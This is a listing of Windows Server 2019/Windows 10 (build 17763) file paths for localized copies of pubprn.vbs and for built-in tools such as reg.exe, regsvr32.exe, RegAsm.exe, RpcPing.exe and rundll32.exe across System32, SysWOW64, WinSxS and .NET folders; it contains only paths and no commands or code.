Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_5e85624d8a696bf4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_a52874116f4afa20\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_a52874116f4afa20\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_41235e866674047b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_41235e866674047b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_ea30a8cd5530066c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_ea30a8cd5530066c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_bb8dc6cb0567d88b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_bb8dc6cb0567d88b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_bf8a042102d8b4fb\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_bf8a042102d8b4fb\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_2305bb536bac6416\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_2305bb536bac6416\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_c03f9b7a61f26015\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_c03f9b7a61f26015\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_bd6b30b663c8b4af\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_bd6b30b663c8b4af\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_66015e4952de1d3d\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_66015e4952de1d3d\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_6627639352cdb219\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_6627639352cdb219\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_0542684047e7a443\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_0542684047e7a443\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_08ded992459fc87b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_08ded992459fc87b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_504f59da29ff9797\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_504f59da29ff9797\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_f306cfd91cd1adf9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_f306cfd91cd1adf9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_952c4ee60fecbfd4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_952c4ee60fecbfd4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_38962b9b025d86ea\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_38962b9b025d86ea\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_2128accfda82b2a6\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_2128accfda82b2a6\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_1f67f80ddbaebc7b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_1f67f80ddbaebc7b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_65a4528fc0d12a2f\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_65a4528fc0d12a2f\r\pubprn.vbs
PPath: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_67f83d33bf5abe13\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_68da0c9fbeca2def\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_68da0c9fbeca2def\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_af7d1e63a3abbc1b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_af7d1e63a3abbc1b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_4b7808d89ad4c676\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_4b7808d89ad4c676\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_f485531f8990c867\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_f485531f8990c867\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_c5e2711d39c89a86\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_c5e2711d39c89a86\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_c9deae73373976f6\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_c9deae73373976f6\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_bc92757d7eee30e5\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_bc92757d7eee30e5\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_59cc55a475342ce4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_59cc55a475342ce4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_56f7eae0770a817e\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_56f7eae0770a817e\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_ff8e1873661fea0c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_ff8e1873661fea0c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_ffb41dbd660f7ee8\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_ffb41dbd660f7ee8\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_9ecf226a5b297112\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_9ecf226a5b297112\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_a26b93bc58e1954a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_a26b93bc58e1954a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_e9dc14043d416466\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_e9dc14043d416466\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_8c938a0330137ac8\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_8c938a0330137ac8\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_2eb90910232e8ca3\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_2eb90910232e8ca3\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_d222e5c5159f53b9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_d222e5c5159f53b9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_bab566f9edc47f75\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_bab566f9edc47f75\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_b8f4b237eef0894a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_b8f4b237eef0894a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_ff310cb9d412f6fe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_ff310cb9d412f6fe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_0184f75dd29c8ae2\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_0184f75dd29c8ae2\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_0266c6c9d20bfabe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_0266c6c9d20bfabe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_4909d88db6ed88ea\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_4909d88db6ed88ea\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_e504c302ae169345\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_e504c302ae169345\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_8e120d499cd29536\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_8e120d499cd29536\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_5f6f2b474d0a6755\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_5f6f2b474d0a6755\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_636b689d4a7b43c5\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_636b689d4a7b43c5\r\pubprn.vbs
Path: C:\Windows\System32\rasautou.exe
Path: C:\Windows\SysWOW64\rasautou.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_009fe89bbd7c8b5f\rasautou.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_0af492edf1dd4d5a\rasautou.exe
Path: C:\Windows\System32\reg.exe
Path: C:\Windows\SysWOW64\reg.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_225a1de282d8e4e1\reg.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_2caec834b739a6dc\reg.exe
Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_703119e5038999ca\RegAsm.exe
Path: C:\Windows\WinSxS\x86_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_b7de50bc1805c2d0\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
Path: C:\Windows\regedit.exe
Path: C:\Windows\SysWOW64\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1_none_e4f49f4a34021293\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1_none_ef49499c6862d48e\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\f\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\r\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\f\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\r\regedit.exe
Path: C:\Windows\System32\regini.exe
Path: C:\Windows\SysWOW64\regini.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_fd1c265411fa4f7a\regini.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_0770d0a6465b1175\regini.exe
Path: C:\Windows\System32\Register-CimProvider.exe
Path: C:\Windows\SysWOW64\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_540f87ef441f7cc7\Register-CimProvider.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_5e64324178803ec2\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_434c448b55fc927a\RegSvcs.exe
Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_8af97b626a78bb80\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
Path: C:\Windows\System32\regsvr32.exe
Path: C:\Windows\SysWOW64\regsvr32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_691d073687ad042e\regsvr32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_7371b188bc0dc629\regsvr32.exe
Path: C:\Windows\System32\replace.exe
Path: C:\Windows\SysWOW64\replace.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\replace.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\replace.exe
Path: C:\Windows\System32\RpcPing.exe
Path: C:\Windows\SysWOW64\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1_none_8e7ff7f598e1efd4\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1_none_98d4a247cd42b1cf\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\f\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\r\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\f\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\r\RpcPing.exe
Path: C:\Windows\System32\rundll32.exe
Path: C:\Windows\SysWOW64\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_c8cb3b750313fee0\rundll32.exe
